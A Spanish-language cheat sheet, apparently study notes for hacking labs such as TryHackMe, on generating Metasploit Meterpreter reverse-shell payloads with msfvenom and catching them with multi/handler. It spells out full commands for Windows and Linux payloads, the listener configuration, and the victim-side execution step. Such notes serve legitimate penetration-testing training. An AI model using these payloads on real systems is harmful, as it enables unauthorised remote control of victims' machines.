### RESUMEN COMPLETO: USO DE `msfvenom` Y `multi/handler`

`msfvenom` y `multi/handler` se usan **en la máquina atacante**, no en la víctima.
Ambos trabajan juntos: uno **genera el payload malicioso**, el otro **espera la conexión de retorno** una vez que el payload se ejecuta en la máquina víctima.

---

### FLUJO GENERAL

1. **En la máquina atacante**:

   * Se genera un **payload** con `msfvenom`.
   * Se inicia un listener con `multi/handler` en `msfconsole`.

2. **En la máquina víctima**:

   * Se ejecuta el payload generado (por ingeniería social, explotación, etc.).

3. **Resultado**:

   * La víctima se conecta de vuelta a la máquina atacante.
   * El handler recibe la conexión y abre una sesión remota.

---

### COMANDOS PASO A PASO

```bash
# Atacante: generar el payload
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.8.0.1 LPORT=4444 -f exe -o shell.exe
```

```bash
# Atacante: iniciar Metasploit
sudo msfconsole

# Atacante: configurar listener
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 10.8.0.1
set LPORT 4444
exploit -j
```

```bash
# Víctima: ejecutar payload
shell.exe
```

---

### ROLES

* **Máquina atacante**:

  * Ejecuta `msfvenom` y `msfconsole`.
  * Alojada localmente o remotamente (por ejemplo, Kali Linux en TryHackMe).
  * Tiene dirección IP accesible por la víctima (e.g. `tun0`, `eth0`, etc.).
  * Recibe la shell.

* **Máquina víctima**:

  * Ejecuta el payload malicioso.
  * Puede estar expuesta en red local o remota.
  * Inicia conexión de reverse shell hacia el atacante.

---

### GLOSARIO TÉCNICO

* **msfvenom**: herramienta para generar payloads (código malicioso ejecutable).
* **multi/handler**: módulo de Metasploit que actúa como listener para recibir conexiones entrantes de shells reversas.
* **payload**: código que se ejecuta en la víctima para establecer control remoto.
* **reverse shell**: tipo de conexión donde la víctima inicia la conexión hacia el atacante.
* **Meterpreter**: payload avanzado de Metasploit que otorga control remoto con múltiples funcionalidades.
* **LHOST**: dirección IP de la máquina atacante donde se espera la conexión entrante.
* **LPORT**: puerto en la máquina atacante donde se escucha la conexión.
* **exploit -j**: lanza el listener en segundo plano.
* **sessions**: lista y gestiona las conexiones activas.

---

### CONDICIÓN CRÍTICA

El valor de `PAYLOAD` debe coincidir **exactamente** entre:

* El usado con `msfvenom`.
* El configurado con `set PAYLOAD` en `multi/handler`.

Si no coinciden, la conexión se pierde o el shell no se establece.

---

### EJEMPLO FUNCIONAL REAL

**Payload:**

```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.14.25 LPORT=443 -f elf -o rev.elf
```

**Handler:**

```bash
use exploit/multi/handler
set PAYLOAD linux/x86/meterpreter/reverse_tcp
set LHOST 10.10.14.25
set LPORT 443
exploit -j
```

**Víctima ejecuta:**

```bash
chmod +x rev.elf && ./rev.elf
```

**Atacante recibe:**

```bash
[*] Meterpreter session 1 opened
```

---

### NOTAS OPERATIVAS

* `msfvenom` y `multi/handler` nunca van en la víctima.
* Ambos están en la máquina del atacante.
* La víctima solo necesita ejecutar el payload (de cualquier forma: manual, automatizada, por explotación, etc.).

Esto asegura control remoto desde la víctima hacia el atacante.
